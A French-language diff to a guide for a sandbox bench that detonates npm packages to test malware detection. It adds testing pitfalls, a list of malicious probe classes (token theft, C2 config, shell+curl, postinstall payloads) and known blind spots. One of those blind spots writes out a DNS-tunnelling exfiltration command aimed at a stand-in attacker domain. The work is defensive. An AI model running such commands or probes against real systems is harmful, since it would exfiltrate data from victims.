@@ -74,7 +74,9 @@ La preuve se lit dans `scripts/cles_scenario3.py` : un canari dans un événemen
 8. `execSync` à `timeout: 25000` × 4 scripts + × 8 bins : 196 s bloquants pour
    un run de 90 s. Budget global, 8 s par script, 4 s par bin.
 9. « Rien vu » sans trace de progression : indistinguable de « jamais exécuté ».
-   Écrire la trace **dans le paquet** (le `/tmp` du conteneur n'est pas ramené).
+   Écrire la trace dans le **répertoire que le harnais ramène** (`/work/out`),
+   jamais dans le paquet : le dossier du paquet n'est pas copié après le run et
+   la trace disparaît avec le conteneur (voir aussi le piège 15).
 10. Le harnais porte l'URL et le corps dans `valeur`, pas dans `url`/`chemin`.
     Chercher les preuves là aussi, sinon une sonde qui atteint son hôte reste « — ».
 11. Compter « toute valeur contenant un point » comme une URL **fabrique des clés**.
@@ -85,10 +87,26 @@ La preuve se lit dans `scripts/cles_scenario3.py` : un canari dans un événemen
 13. Énumérer `node_modules` à plat rate **tous les paquets scopés**
     (`node_modules/@scope/nom`) : la moitié de l'écosystème n'est alors jamais
     inspectée. Descendre d'un niveau dans les dossiers `@*`.
+14. Une sonde qui ne parse pas rend « — » : c'est un faux négatif du **banc**, pas
+    une force de la sandbox, et il pousse à « corriger » un trou qui n'existe pas.
+    Deux causes vues : du JS fabriqué depuis une chaîne hôte où les guillemets
+    imbriqués cassent le fichier, et une modification de sonde non revérifiée.
+    Règle : garder les charges utiles **sans guillemets imbriqués** (construire les
+    chaînes par concaténation ou `String.fromCharCode`, passer les chemins par
+    variable), puis `node --check` sur **chaque** sonde générée avant de croire au
+    banc. Une sonde doit d'abord être détectée par construction ; si elle ne l'est
+    pas, suspecter la sonde avant la sandbox.
+15. Un paramètre de scénario passé par **variable d'environnement** est perdu en
+    silence : `sudo` réinitialise l'environnement (`VAR=x sudo -n bash script.sh`
+    ne transmet rien) et le harnais lance la cible avec un environnement contrôlé.
+    Symptôme : la sonde reste muette exactement comme si le paramètre valait zéro.
+    Transmettre par **fichier** déposé à côté du pilote (`_sbx_offset.json`) et lu
+    au démarrage, ou par `sudo -n env VAR=… bash …` pour ce qui pilote les
+    processus extérieurs (docker, timeout).
 
 ## Le banc de sondes (scripts/fabrique_sondes.py)
 
-Douze classes malveillantes + un témoin : postinstall, ESM, timer 3 jours, bin
+Treize classes malveillantes + un témoin : postinstall, ESM, timer 3 jours, bin
 seul, jeton npm, config C2, `exports` sans `main`, payload `eval`, shell+curl,
 hook auto-installé, session WhatsApp, **charge utile dans `exports` derrière un
 `index.js` bénin**, **postinstall d'une dépendance**. Note de départ : 13/13 vues,
@@ -101,6 +119,25 @@ rend des constats, puis le **banc est rejoué**. Le banc est le juge, le panel e
 l'inspirateur : un constat n'est retenu que si le score tient et que le témoin
 reste muet. Détail du panel, du format de constat et de la veille :
 `references/audit-loop.md`.
+
+## Limites assumées (à énoncer, pas à masquer)
+
+- **Plafonner les délais n'est pas simuler le temps.** Un `setTimeout` de trois
+  jours part en 1,5 s, mais `Date.now()` reste réel : une charge utile qui teste
+  « 30 jours écoulés depuis l'installation » ne se déclenche pas. Un décalage
+  d'horloge côté pilote est la piste ; tant qu'il n'est pas mesuré par une sonde
+  dédiée, ne jamais l'annoncer comme acquis.
+- **Tunnel DNS** : le faux-Internet voit SNI/HTTP, pas les requêtes UDP brutes.
+  Un `dig TXT <base32>.attaquant.tld` passe sous le journal sans laisser de trace.
+- **Phase d'installation** : installée hors sandbox (`--ignore-scripts`) puis
+  rejouée ; l'ordre npm réel, les builds natifs et les résolutions transitives ne
+  sont pas observés.
+
+## Concurrents et inspiration
+
+La cartographie des dépôts qui font la même chose, ce qu'ils font mieux, ce qu'il
+ne faut PAS copier, et la recette pour les lire sans brûler le quota GitHub :
+`references/concurrents.md`.
 
 ## Ce qu'un « rien » veut dire
 
@@ -116,6 +153,24 @@ Le protocole complet, les scripts réels et le journal d'audit vivent sur
 publiée avec sa mesure (`scripts/publier.sh "titre" "avant → après"`), pour que
 l'historique dise ce qui a été corrigé **et ce que ça a changé**.
 
+## Horloge accélérée (mois/années)
+
+Plafonner les délais ne suffit pas : une charge qui compare des dates
+(`Date.now() - installe > 30 jours`) ne se déclenche jamais. Le pilote décale
+donc l'horloge du paquet (`_sbx_offset.json` à côté du pilote, `SBX_OFFSET_JOURS`).
+**Deux pièges mesurés :**
+
+- **Le budget du harnais doit lire la VRAIE horloge.** En décalant `Date.now()`
+  globalement, `reste()` voit 30 jours écoulés et saute tout, vrai code compris :
+  la sonde reste muette pour la mauvaise raison. Capturer `VRAI_NOW_MS` avant le
+  décalage et l'utiliser pour le budget uniquement.
+- **`sudo` ne propage pas l'environnement.** Les paramètres de scénario passent
+  par `sudo -n env VAR=... bash detoner-obs.sh`, et à l'intérieur du conteneur par
+  un **fichier** (l'environnement du paquet est contrôlé par le harnais).
+
+Contrôle obligatoire : installé il y a 1 jour + offset 0 → muet ; même paquet +
+offset 30 → la sonde frappe. Sans ce couple, le test ne prouve rien.
+
 ## Enchaînement
 
 0. Construire ou rejouer le banc **avant** de promettre quoi que ce soit :
@@ -125,4 +180,6 @@ l'historique dise ce qui a été corrigé **et ce que ça a changé**.
 2. `python3 scripts/cles_scenario3.py <prefixe>` → une ligne par paquet, `CLÉ`
    ou `—`, avec les hôtes et les canaris sortis.
 3. Verser les clés dans le rapport ; ne jamais promouvoir une règle statique sur
-   la base d'un run partiel.
+   la base d'un run partiel. **Recompter mécaniquement tout total annoncé**
+   (« 6 sur 12 ») depuis les fichiers de résultats, jamais de mémoire : un
+   décompte faux invalide tout le reste du rapport, même si les règles sont justes.
